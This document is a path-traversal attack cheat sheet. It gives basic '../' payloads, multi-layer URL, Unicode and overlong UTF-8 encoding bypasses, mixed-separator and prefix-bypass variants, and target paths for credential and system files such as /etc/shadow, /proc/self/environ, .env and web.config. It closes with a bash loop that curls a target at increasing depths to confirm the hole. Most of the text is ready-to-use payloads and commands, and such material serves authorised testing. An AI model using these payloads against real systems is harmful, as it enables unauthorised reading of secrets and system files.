# Path Traversal — Basic Payloads + Encoding

## When this applies

- Application accepts a filename / path parameter that is concatenated into a filesystem read.
- No (or naive) sanitization for `..`, `/`, `\`, encoding.
- Goal: read sensitive files outside the intended directory.

## Technique

Try basic `..` traversal first, then escalate through encoding (URL, double, Unicode, UTF-8 overlong) and platform variations (Linux `/` vs Windows `\`).

## Steps

### Basic traversal

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
```

### Common depths by platform

```
Linux (typical web app):     ../../../etc/passwd
Windows (IIS default):        ..\..\..\..\windows\win.ini
Docker container:             ../../../../etc/passwd
Shared hosting:              ../../../../../etc/passwd
```

### Quick test payloads

```bash
# Linux
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# Windows
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini

# Universal (works on both)
../../../etc/passwd
..\..\..\windows\win.ini
```

### URL encoding — single

| Character | Encoded |
|-----------|---------|
| `/` | `%2f` |
| `\` | `%5c` |
| `.` | `%2e` |
| `%` | `%25` |

```
../../../etc/passwd
→ ..%2f..%2f..%2fetc%2fpasswd

..\..\..\windows\win.ini
→ ..%5c..%5c..%5cwindows%5cwin.ini
```

### URL encoding — double / triple

| Character | Single | Double | Triple |
|-----------|--------|--------|--------|
| `/` | `%2f` | `%252f` | `%25252f` |
| `\` | `%5c` | `%255c` | `%25255c` |
| `.` | `%2e` | `%252e` | `%25252e` |

```
# Double encoding (most common)
..%252f..%252f..%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Triple encoding (rare)
%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd

# Partial double encoding (encode only the second nibble of the percent-encoded char)
.%%32%65.%%32%65/etc/passwd
```

### Unicode — full-width

```
%uff0e = .  (full-width period)
%u2215 = /  (division slash)
%u2216 = \  (set minus)

# Example
%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/passwd
```

### UTF-8 overlong

```
%c0%ae = .  (overlong encoding)
%c0%af = /  (overlong encoding)
%c1%9c = \  (overlong encoding)

# Example
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
```

### Overlong UTF-8 sequences

```
# 2-byte overlong
. = %c0%ae
/ = %c0%af

# 3-byte overlong
. = %e0%80%ae
/ = %e0%80%af

# 4-byte overlong (rare)
. = %f0%80%80%ae
/ = %f0%80%80%af
```

### 16-bit Unicode

```
%u002e = .
%u002f = /
%u005c = \

# Example
%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd
```

### Mixed separators

```
# Forward and backslash
..\/..\/..\/etc/passwd
..\/..\/..\/windows\win.ini

# Double separators
....////....////....////etc/passwd
...\\\...\\\...\\\windows\win.ini
```

### Path-prefix bypass

```
# Pattern: [REQUIRED_PREFIX] + [TRAVERSAL] + [TARGET]

/var/www/images/../../../etc/passwd
/opt/app/static/../../../../etc/passwd
/home/user/uploads/../../../../../../../etc/passwd

# Windows
C:\inetpub\wwwroot\images\..\..\..\..\windows\win.ini
```

### Absolute path

```
# Linux/Unix
/etc/passwd
/etc/shadow
/proc/self/environ
/var/www/html/.env

# Windows
C:\windows\win.ini
C:\inetpub\wwwroot\web.config
D:\files\sensitive.txt

# Mixed (some systems)
/c:/windows/win.ini
```

### Traversal depth calculation

Count directory levels from the code's base path to filesystem root:

```
Code: include("uploads/" . $input)    # Base: uploads/
Working dir: /var/www/html/            # Full: /var/www/html/uploads/
Depth: uploads→html→www→var→/  = 4 levels needed
```

**Always test depths 3-8.** Docker containers and non-standard installs vary.

### Bash loop through depths

```bash
for i in {1..10}; do
    payload=$(printf '../%.0s' $(seq 1 $i))
    echo "[*] Testing depth $i: ${payload}etc/passwd"
    curl -s "https://target.com/file?name=${payload}etc/passwd" | grep -q "root:x" && echo "[+] VULNERABLE at depth $i" && break
done
```

## Verifying success

- Response body contains `root:x:0:0:` (or other recognizable file content).
- Status 200 with file-like content rather than HTML error page.
- Different depths return different content (confirming relative-path semantics).

## Common pitfalls

- Some servers normalize `..` away — use encoding bypasses.
- Leading-`/` may indicate filesystem root or something else (chroot, sandbox).
- Wrong depth → 404 / empty response. Iterate 3–8 levels.

## Tools

- Burp Suite Repeater + Intruder
- ffuf with path-traversal wordlists
- dotdotpwn
- curl with `--path-as-is`
